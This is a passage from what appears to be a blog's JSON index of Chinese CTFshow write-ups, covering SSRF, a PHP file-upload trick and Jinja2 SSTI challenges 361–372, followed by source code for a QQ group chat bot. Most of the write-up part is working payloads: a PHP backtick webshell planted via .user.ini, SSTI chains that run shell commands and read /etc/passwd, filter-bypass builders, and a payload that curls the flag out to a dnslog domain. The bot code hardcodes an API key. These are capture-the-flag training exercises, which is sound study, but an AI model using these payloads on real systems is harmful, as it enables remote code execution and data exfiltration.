ceye.io 来实现攻击，DNS Rebinding 中设置两个 IP，一个是 127.0.0.1 另一个是随便可以访问的 IP\n```\n\n**358**\n\n正则匹配要求URL以http://ctf.开头，以show结尾\n\n一个完整的URL的格式如下\n\n`http://username:password@hostname/path?arg=value#anchor`\n\n其中hostname就是我们平常使用的网址，我们只需要让username位置为ctf.，让anchor位置为show即可\n\n```\npayload:\nPOST\nurl=http://ctf.@127.0.0.1/flag.php#show\n```\n\n**359**\n\n随便输入个用户名密码尝试登录\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-01 01.12.20.png)\n\n抓包发现returl参数可能存在SSRF注入点，使用Gopherus生成攻击payload\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-01 22.36.11.png)\n\n写入之后访问即可\n\n**360**\n\n同上\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-01 22.44.48.png)\n\n\n\n\n\n","tags":["CTF","web"]},{"title":"CTFshow记录","url":"/posts/82271b5a.html","content":"\n### baby杯——baby_php\n\n审计代码，明显是文件上传\n\n```PHP\nclass fileUtil{\n\n    private $name;\n    private $content;\n\n\n    public function __construct($name,$content=''){\n        $this->name = $name;\n        $this->content = $content;\n        ini_set('open_basedir', '/var/www/html');\n    }\n\n    public function file_upload(){\n        if($this->waf($this->name) && $this->waf($this->content)){\n            return file_put_contents($this->name, $this->content);\n        }else{\n            return 0;\n        }\n    }\n\n    private function waf($input){\n        return !preg_match('/php/i', $input);\n    }\n\n    public function file_download(){\n        if(file_exists($this->name)){\n            header('Content-Type: application/octet-stream');\n            header('Content-Disposition: attachment; filename=\"'.$this->name.'\"');\n            header('Content-Transfer-Encoding: binary');\n            echo file_get_contents($this->name);\n        }else{\n            return False;\n        }\n    }\n\n    public function __destruct(){\n\n    }\n\n}\n\n$action = $_GET['a']?$_GET['a']:highlight_file(__FILE__);\n\nif($action==='upload'){\n    die('Permission denied');\n}\n\nswitch ($action) {\n    case 'upload':\n        $name = $_POST['name'];\n        $content = $_POST['content'];\n        $ft = new fileUtil($name,$content);\n        if($ft->file_upload()){\n            echo $name.' upload success!';\n        }\n        break;\n    case 'download':\n        $name = $_POST['name'];\n        $ft = new fileUtil($name,$content);\n        if($ft->file_download()===False){\n            echo $name.' download failed';\n        }\n        break;\n    default:\n        echo 'baby come on';\n        break;\n}\n```\n\n小知识：$_GET['a']在没有被赋值时默认值时true，case的判定是弱相等\n\n关键代码\n\n```PHP\n$action = $_GET['a']?$_GET['a']:highlight_file(__FILE__);\n\nif($action==='upload'){//a只声明不赋值默认为true，强相等判定无法通过\n    die('Permission denied');\n}\n\nswitch ($action) {\n    case 'upload'://true==\"upload\"，判定结果为真，进入upload上传文件\n```\n\n查看响应头中间件为nginx，上传.user.ini文件来包含，一定要先上传1.txt文件，不然在auto_prepend_file参数生效并且找不到1.txt时整个环境就废了\n\n```\npayload:?a=\nPOST:\ncontent=<?=`$_GET['kkk']`;?>&name=1.txt\nPOST:\ncontent=auto_prepend_file=\"1.txt\"&name=.user.ini\n\npayload:?kkk=tac /flag_baby_here_you_are\n```\n\n","tags":["CTF","web"]},{"title":"CTFshowSSTI","url":"/posts/45647.html","content":"\n# SSTI\n\n### **Python中有用的魔术方法**\n\n```python\n__class__           查看对象所在的类\n__mro__             查看继承关系和调用顺序，返回元组\n__base__            返回基类\n__bases__           返回基类元组\n__subclasses__()    返回子类列表\n__init__            调用初始化函数，可以用来跳到__globals__\n__globals__         返回函数所在的全局命名空间所定义的全局变量，返回字典\n__builtins__        返回内建内建名称空间字典\n__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里\n__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如:a.xxx/a.xxx()）\t\t都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。\n__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')\n__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。\n__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()\n__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。\nurl_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app\nget_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app\nlipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}\n{{cycler.__init__.__globals__.os.popen('ls').read()}}\ncurrent_app          应用上下文，一个全局变量\nrequest              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\\self\\fd/3').read()\nrequest.args.x1   \t get传参\nrequest.values.x1 \t 所有参数\nrequest.cookies      cookies参数\nrequest.headers      请求头参数\nrequest.form.x1   \t post传参\t(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)\nrequest.data  \t\t post传参\t(Content-Type:a/b)\nrequest.json\t\t post传json  (Content-Type: application/json)\nconfig               当前application的所有配置。此外，也可以这样{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}\n```\n\n### 代码块\n\n```\n变量块 {{}}\t用于将表达式打印到模板输出\n注释块 {##}\t注释\n控制块\t{%%}\t可以声明变量，也可以执行语句\n行声明\t##\t\t可以有和{%%}相同的效果\n```\n\n### 常用的过滤器\n\n```\nint()：将值转换为int类型；\nfloat()：将值转换为float类型；\nlower()：将字符串转换为小写；\nupper()：将字符串转换为大写；\ntitle()：把值中的每个单词的首字母都转成大写；\ncapitalize()：把变量值的首字母转成大写，其余字母转小写；\ntrim()：截取字符串前面和后面的空白字符；\nwordcount()：计算一个长字符串中单词的个数；\nreverse()：字符串反转；\nreplace(value,old,new)： 替换将old替换为new的字符串；\ntruncate(value,length=255,killwords=False)：截取length长度的字符串；\nstriptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；\nescape()或e：转义字符，会将<、>等符号转义成HTML中的符号。显例：content|escape或content|e。\nsafe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{'<em>hello</em>'|safe}}；\nlist()：将变量列成列表；\nstring()：将变量转换成字符串；\njoin()：将一个序列中的参数值拼接成字符串。示例看上面payload；\nabs()：返回一个数值的绝对值；\nfirst()：返回一个序列的第一个元素；\nlast()：返回一个序列的最后一个元素；\nformat(value,arags,*kwargs)：格式化字符串。比如：{{ \"%s\" - \"%s\"|format('Hello?',\"Foo!\") }}将输出：Helloo? - Foo!\nlength()：返回一个序列或者字典的长度；\nsum()：返回列表内数值的和；\nsort()：返回排序后的列表；\ndefault(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。\nlength()返回字符串的长度，别名是count\n```\n\n### **Flask的一些全局变量 && 关键字**\n\n```python\n{{config}}\n{{requests}}\n{{requests.environ}}\n{{self}}\n{{url_for}}\n{{get_flashed_messages}}\n{{url_for.__globals__[\"os\"].system('calc')}}\n```\n\n### 常用payload\n\n```\n>>>''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()\n>>>''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')\n//想要获取命令执行结果可以在后面加上.read()\n>>>''.__class__.__mro__[1].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()\n \n--------------------------------\n \n>>>object.__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()\n>>>object.__subclasses__()[59].__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('id').read()\")\n>>>object.__subclasses__()[59].__init__.__globals__.__builtins__.eval(\"__import__('os').popen('id').read()\")\n>>>object.__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()\n>>>object.__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()\n \n--------------------------------\n{{''.__class__.__mro__[-1].__subclasses__()[200]('calc') }}\n其中的xxxx可以为任意字符\n{{''.__class__.__mro__[-1].__subclasses__().xxxx.__init__.__globals__.__builtins__.eval(\"__import__('os').popen('whoami').read()\") }}\n{{''.__class__.__mro__[-1].__subclasses__().xxxx.__init__.__globals__.__builtins__.exec(\"__import__('os').popen('calc').read()\") }} #本地测试不知道为什么执行whoami只会返回None\n\n```\n\n[拓展](https://dar1in9s.github.io/2020/09/15/ssti进阶/)\n\n**361**\n\n无过滤，参数名为name，直接执行命令即可\n\n```\npayload:?name={{\"\".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('tac /flag').read()}}\n```\n\n**362**\n\n过滤了数字，使用全角数字代替正常数字\n\n```\npayload:?name={{\"\".__class__.__base__.__subclasses__()[１３２].__init__.__globals__['popen']('tac /flag').read()}}\n```\n\n**363**\n\n过滤了单双引号，可通过request.args传入新参数解决，或者使用chr来绕过\n\n```\n//request.args\npayload:?name={{config.__class__.__init__.__globals__[request.args.a][request.args.b](request.args.c).read()}}&a=os&b=popen&c=tac /flag\n```\n\n```\n//chr\npayload:?name={% set chr=url_for.__globals__.__builtins__.chr %}{{url_for.__globals__[chr(111)%2bchr(115)].popen(chr(116)%2bchr(97)%2bchr(99)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read()}}\n```\n\n**364**\n\n过滤了args，无法使用GET传参了，使用~~POST（方法被禁用了）~~或者cookie都可\n\n```\n//cookie\npayload:?name={{config.__class__.__init__.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()}}\nCookie: a=os;b=popen;c=tac /flag;\n```\n\n```\n//chr\npayload:?name={% set chr=url_for.__globals__.__builtins__.chr %}{{url_for.__globals__[chr(111)%2bchr(115)].popen(chr(116)%2bchr(97)%2bchr(99)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read()}}\n```\n\n**365**\n\n过滤了中括号，换点\n\n```\n//cookie\npayload:?name={{config.__class__.__init__.__globals__.os.popen(request.cookies.a).read()}}\nCookie: a=tac /flag\n```\n\n**366**\n\n过滤了下划线，这里用attr方法：request|attr(request.cookies.a)等价于request[“a”]\n\n```\npayload:?name={{(config|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)).os.popen(request.cookies.d).read()}}\nCookie: a=__class__; b=__init__; c=__globals__; d=tac /flag;\n```\n\n他人WP\n\n```\npayload:?name={{(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()}}\nCookie: a=__globals__;b=cat /flag;\n```\n\n**367**\n\n过滤了os，继续用attr\n\n```\npayload:?name={{(config|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)).get(request.cookies.e).popen(request.cookies.d).read()}}\nCookie: a=__class__; b=__init__; c=__globals__; d=tac /flag; e=os;\n```\n\n**368**\n\n过滤了{undefined{undefined，使用命令方式print\n\n```\npayload:?name={% print((config|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)).get(request.cookies.e).popen(request.cookies.d).read()) %}\nCookie: a=__class__; b=__init__; c=__globals__; d=tac /flag; e=os;\n```\n\n**369**\n\n过滤了request，没办法传递参量了，使用模版过滤器\n\n```\npayload:?name={% set po=dict(po=a,p=a)|join%}//构造pop，为下方提供_\n{% set a=(()|select|string|list)|attr(po)(24)%}//构造出_\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}//构造出__init__\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}//构造出__globals__\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}//构造出__getitem__\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}//构造出__builtins__\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}//构造出builtins模块\n{% set chr=x.chr%}//使用chr函数\n{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}//构造出字符串/flag\n{%print(x.open(file).read())%}//读文件\n```\n\n**370**\n\n过滤数字用全角，或者使用length，count构造数字\n\n```\npayload:?name=\n{% set po=dict(po=a,p=a)|join%}\n{% set a=(()|select|string|list)|attr(po)(２４)%}\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}\n{% set chr=x.chr%}\n{% set file=chr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%}\n{%print(x.open(file).read())%}\n```\n\n**371**\n\nprint回显被禁，dnslog外带\n\n```\n?name={%set po=(dict(po=a,p=a)|join)%}\n{% set ershisi=(dict(eeeeeeeeeeeeeeeeeeeeeeee=a)|join|length)%}\n{% set xiahuaxian=(()|select|string|list)|attr(po)(ershisi)%}\n{% set ur=((dict(ur=a,l=a)|join,xiahuaxian,dict(fo=a,r=a)|join)|join)%}\n{% set glo=((xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join)%}\n{% set ous=(dict(o=a,s=a)|join)%}\n{% set ouuu=(ur|attr(glo)|attr(ous))%}\n```\n\n```\n?name={%set a=dict(po=aa,p=aa)|join%}{%set j=dict(eeeeeeeeeeeeeeeeee=a)|join|length%}{%set k=dict(eeeeeeeee=a)|join|length%}{%set l=dict(eeeeeeee=a)|join|length%}{%set n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|length%}{%set m=dict(eeeeeeeeeeeeeeeeeeee=a)|join|length%}{% set b=(lipsum|string|list)|attr(a)(j)%}{%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%}{%set d=(b,b,dict(getit=cc,em=aa)|join,b,b)|join%}{%set e=dict(o=cc,s=aa)|join%}{% set f=(lipsum|string|list)|attr(a)(k)%}{%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%}{%set p=((lipsum|attr(c))|string|list)|attr(a)(n)%}{%set q=((lipsum|attr(c))|string|list)|attr(a)(m)%}{%set i=(dict(curl=aa)|join,f,p,dict(cat=a)|join,f,g,dict(flag=aa)|join,p,q,dict(czducq=a)|join,q,dict(dnslog=a)|join,q,dict(cn=a)|join)|join%}{%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%}{%endif%}\n```\n\n**372**\n\ncount换成length\n\n```\n?name={%set a=dict(po=aa,p=aa)|join%}{%set j=dict(eeeeeeeeeeeeeeeeee=a)|join|length%}{%set k=dict(eeeeeeeee=a)|join|length%}{%set l=dict(eeeeeeee=a)|join|length%}{%set n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|length%}{%set m=dict(eeeeeeeeeeeeeeeeeeee=a)|join|length%}{% set b=(lipsum|string|list)|attr(a)(j)%}{%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%}{%set d=(b,b,dict(getit=cc,em=aa)|join,b,b)|join%}{%set e=dict(o=cc,s=aa)|join%}{% set f=(lipsum|string|list)|attr(a)(k)%}{%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%}{%set p=((lipsum|attr(c))|string|list)|attr(a)(n)%}{%set q=((lipsum|attr(c))|string|list)|attr(a)(m)%}{%set i=(dict(curl=aa)|join,f,p,dict(cat=a)|join,f,g,dict(flag=aa)|join,p,q,dict(czducq=a)|join,q,dict(dnslog=a)|join,q,dict(cn=a)|join)|join%}{%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%}{%endif%}\n```\n\n","tags":["CTF","web","SSTI"]},{"title":"罗伯特","url":"/posts/61106.html","content":"\n```python\n#bot.py\nfrom unittest.mock import NonCallableMagicMock\nfrom flask import Flask, request\nimport requests\nimport api\napp = Flask(__name__)\n\n'''监听端口，获取QQ信息'''\n@app.route('/', methods=[\"POST\"])\ndef post_data():\n    '下面的request.get_json().get......是用来获取关键字的值用的，关键字参考上面代码段的数据格式'\n    if request.get_json().get('message_type')=='private':\n        uid = request.get_json().get('sender').get('user_id')\n        message = request.get_json().get('raw_message')\n        api.keywordForPerson(message,uid)\n    if request.get_json().get('message_type')=='group':\n        gid = request.get_json().get('group_id')\n        uid = request.get_json().get('sender').get('user_id')\n        message = request.get_json().get('raw_message')\n        nick=request.get_json().get('sender').get('nickname')\n        role=request.get_json().get('sender').get('role')\n        api.keywordForGroup(message, gid, uid,nick,role)\n    return 'OK'\n\n\nif __name__ == '__main__':\n    app.run(debug=True, host='127.0.0.1', port=5701)\n\n```\n\n```python\n#api.py\nimport person\nimport group\nimport requests\nimport re\nimport time\nimport json\nimport random\n\n\n\ndef help():\n    return \"天气：输入天气 地名，获取当地天气，默认为徐州天气\\n双色球：输入双色球查看最新一期双色球开奖信息以及奖池累计金额\\n扔瓶子：私聊罗伯特并发送以下内容：\\n扔瓶子 发送者（可填匿名） 接受者（可填空） 内容\\n来扔瓶子\\n捞瓶子：发送捞瓶子来捞别人扔的瓶子\\n帮助：输入/help，获取帮助\"\ndef weather(message):\n    try:\n        city=message.split(' ')[1]\n    except:\n        city='徐州'\n    try:\n        ercode=requests.get(url='http://wthrcdn.etouch.cn/weather_mini?city='+city,timeout=1).text\n    except:\n        return \"罗伯特被学校关起来了呜呜\"\n    if \"invilad-citykey\" in ercode:\n        return \"抱歉，您的输入有误，请检查后再试\"\n    weatherInfo=requests.get(url='http://wthrcdn.etouch.cn/weather_mini?city='+city).json()['data']['forecast'][0]\n    ganmao=requests.get(url='http://wthrcdn.etouch.cn/weather_mini?city='+city).json()['data']['ganmao']\n    fl=re.search(r\"[0-9]+\",weatherInfo['fengli']).group(0)\n    hi=re.search(r\"[0-9]+\",weatherInfo['high']).group(0)\n    lo=re.search(r\"[0-9]+\",weatherInfo['low']).group(0)\n    weatherInfo=f\"今日{city}天气{weatherInfo['type']}，最高温度{hi}℃，最低温度{lo}℃，{weatherInfo['fengxiang']}{fl}级\\n温馨提示，{ganmao}\"\n    return weatherInfo\ndef buquan(message,uid):\n    #计算括号数量并自动补全\n    def countBracket(message):\n        countban=0\n        for i in message:\n            if i=='(':\n                countban+=1\n            if i==')':\n                countban-=1\n        countquan=0\n        for i in message:\n            if i=='（':\n                countquan+=1\n            if i=='）':\n                countquan-=1\n        return {'ban':countban,'quan':countquan}\n    #自动补全括号\n    ban=countBracket(message)['ban']\n    quan=countBracket(message)['quan']\n    bu=\"\"\n    if not (ban or quan):\n        return\n    if ban>0:\n        for i in range(ban):\n            bu+=')'\n    elif ban<0:\n        for i in range(-ban):\n            bu+='('\n    if quan>0:\n        for i in range(quan):\n            bu+='）'\n    elif quan<0:\n        for i in range(-quan):\n            bu+='（'\n    print(bu+f\"[CQ:at,qq={uid}]帮你补括号\")\n    return bu+f\"[CQ:at,qq={uid}]帮你补括号\"\ndef theDoubleChromosphere(uid):\n    tex=requests.get(\"http://www.cwl.gov.cn/fcpz/yxjs/ssq/\").text\n    #获取红球\n    red=re.search(r\"<div class=\\\"ssqRed-dom\\\">\\[(.*?)\\]</div>\",tex).group(1)\n    red=red.split(',')\n    #获取蓝球\n    blue=re.search(r\"<div class=\\\"ssqBlue-dom\\\">\\[(.*?)\\]</div>\",tex).group(1)\n    blue=blue.split(',')\n    #获取期号\n    qh=re.search(r\"<div class=\\\"ssqQh-dom\\\">(.*?)</div>\",tex).group(1)\n    #获取奖池\n    pool=re.search(r\"<div class=\\\"ssqPool-dom\\\">(.*?)</div>\",tex).group(1)\n    return f\"第{qh}期开奖结果为：\\n红球：{red}\\n蓝球：{blue}\\n奖池：{pool}\\n[CQ:at,qq={uid}]害搁着等着干啥呢，赶紧买彩票去啊\"\ndef sign(gid,uid,nick):\n    today=time.strftime(\"%Y-%m-%d\",time.localtime())\n    groupUserInfo=group.readGroupUserInfo()\n    try:\n        thisGroupUserInfo=groupUserInfo[str(gid)]\n    except:\n        thisGroupUserInfo={}\n        thisGroupUserInfo[str(uid)]={\"nick\": nick, \"point\": 0, \"signTime\": \"\", \"ban\": False}\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n    except:\n        thisUser={\"nick\": nick, \"point\": 0, \"signTime\": \"\", \"ban\": False}\n        thisGroupUserInfo[str(uid)]=thisUser\n    if thisUser['signTime']==today:\n        return f\"[CQ:at,qq={uid}]您今天已经签到过了，明天再来吧\"\n    else:\n        thisUser['point']+=1\n        thisUser['signTime']=today\n        group.saveGroupUserInfo(groupUserInfo)\n        return f\"[CQ:at,qq={uid}]签到成功，您的积分为{thisUser['point']}，明天再来吧\"\ndef getQQ(message):\n    try:\n        qq=re.search(r\"qq=(\\d+)\",message).group(1)\n    except:\n        qq=None\n    return qq\ndef ban(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    thisUser=thisGroupUserInfo[str(uid)]\n    thisUser['ban']=True\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    group.saveGroupUserInfo(groupUserInfo)\n    return f\"好，我们不和[CQ:at,qq={uid}]玩\"\ndef unban(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    thisUser=thisGroupUserInfo[str(uid)]\n    thisUser['ban']=False\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    group.saveGroupUserInfo(groupUserInfo)\n    return f\"好吧，我原谅你了[CQ:at,qq={uid}]\"\ndef keywordForPerson(message, uid):\n    if message[0:2]=='天气':\n        person.sendMessage(weather(message),uid)\ndef isBan(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n        if thisUser['ban']:\n            return True\n        else:\n            return False\n    except:\n        return False\ndef point(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n        return f\"[CQ:at,qq={uid}]您的积分为{thisUser['point']}\"\n    except:\n        return f\"[CQ:at,qq={uid}]请先签到后重试\"\ndef isAdmin(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n        if thisUser['admin']:\n            return True\n        else:\n            return False\n    except:\n        return False\ndef giveAdmin(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n    except:\n        thisUser={\"nick\": \"nick\", \"point\": 0, \"signTime\": \"\", \"ban\": False}\n    thisUser['admin']=True\n    thisGroupUserInfo[str(uid)]=thisUser\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    group.saveGroupUserInfo(groupUserInfo)\n    return f\"没问题，以后我就听你的啦[CQ:at,qq={uid}]\"\ndef today(message):\n    try:\n        message=message.split(' ')\n        message=message[1]\n    except:\n        message=None\n        return f\"请输入运势 星座来查询今日运势\"\n    if len(message)==2:\n        message=message+\"座\"\n    url=\"http://web.juhe.cn:8080/constellation/getAll\"\n    params={\n        \"key\":\"4a11bbcbf089edaf14c2d9bdb80c2ec4\",\n        \"consName\":message,\n        \"type\":\"today\"\n    }\n    ys=requests.get(url=url,params=params).json()\n    return f\"{ys['name']}今日运势：\\n综合指数：{ys['all']}%\\n幸运色：{ys['color']}\\n健康指数：{ys['health']}%\\n爱情指数：{ys['love']}%\\n财运指数：{ys['money']}%\\n工作指数：{ys['work']}%\\n幸运数字：{ys['number']}\\n适配星座：{ys['QFriend']}\\n总结：{ys['summary']}\"\ndef minusPoint(gid,uid,point):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n    except:\n        return f\"[CQ:at,qq={uid}]请先签到后重试\"\n    if thisUser['point']-point < 0:\n        return f\"[CQ:at,qq={uid}]您的积分不足\"\n    thisUser['point']-=point\n    thisGroupUserInfo[str(uid)]=thisUser\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    group.saveGroupUserInfo(groupUserInfo)\n    return \"OK\"\ndef throwBottle(uid,message):\n    try:\n        me=message.split(\" \",3)\n        send=me[1]\n        rec=me[2]\n        con=me[3]\n        with open('bottle.json','r') as f:\n            bottle = json.load(f)\n        nb={\n            \"QQ\":str(uid),\n            \"send\":send,\n            \"rec\":rec,\n            \"con\":con\n        }\n        bottle.append(nb)\n        with open('bottle.json','w') as f:\n            json.dump(bottle,f)\n        return f\"biu～～～瓶子被扔走啦，坐等被人打捞吧～～～\"\n    except:\n        return \"扔瓶子失败了，请检查内容格式是否为：\\n扔瓶子 发送者（可填匿名） 接受者（可填空） 内容\"\ndef getBottle(uid):\n    with open('myBottles.json','r') as f:\n        myBottles = json.load(f)      \n    with open('bottle.json','r') as f:\n        bottle = json.load(f)\n    num=random.randint(0,len(bottle)-1)\n    nb=bottle[num]\n    bottle.remove(nb)\n    try:\n        myBottles[str(uid)].append(nb)\n    except:\n        myBottles[str(uid)]=[nb]\n    with open('bottle.json','w') as f:\n        json.dump(bottle,f)\n    with open('myBottles.json','w') as f:\n        json.dump(myBottles,f)\n    return f\"{nb['send']}扔给了{nb['rec']}一个瓶子，内容是：{nb['con']}\"\ndef myBottles(uid):\n    with open('myBottles.json','r') as f:\n        myBottles = json.load(f)\n    try:\n        myBottles[str(uid)]\n    except:\n        return \"您还没有瓶子呢，快去捞瓶子吧～～～\"\n    me=\"\"\n    for i in myBottles[str(uid)]:\n        me+=f\"{i['send']}扔给了{i['rec']}一个瓶子，内容是：{i['con']}\\n\"\n    return f\"[CQ:at,qq={uid}]您的瓶子有：\\n{me}\"\ndef cleanBottles(message,uid):\n    num=message.split(\" \")[1]\n    with open('myBottles.json','r') as f:\n        myBottles = json.load(f)\n    try:\n        myBottles[str(uid)]\n    except:\n        return f\"[CQ:at,qq={uid}]您还没有瓶子呢，快去捞瓶子吧～～～\"\n    try:\n        nb=myBottles[str(uid)].pop(int(num)-1)\n        with open('myBottles.json','w') as f:\n            json.dump(myBottles,f)\n        return f\"[CQ:at,qq={uid}]您摔碎了{nb['send']}扔给{nb['rec']}一个瓶子，内容是：{nb['con']}\"\n    except:\n        return f\"[CQ:at,qq={uid}]您还没有这个瓶子，快去捞一个吧\"\n\n\ndef keywordForGroup(message, gid, uid,nick,role):\n    if isBan(gid,uid) and not isAdmin(gid,uid):\n        return\n    if message[0:2]=='天气':\n        group.sendMessage(weather(message),gid)\n    elif message[0:2]=='运势':\n        group.sendMessage(today(message),gid)\n    elif message==\"积分\":\n        group.sendMessage(point(gid,uid),gid)\n    elif message[0:4]==\"听他的话\" and uid==405454586:\n        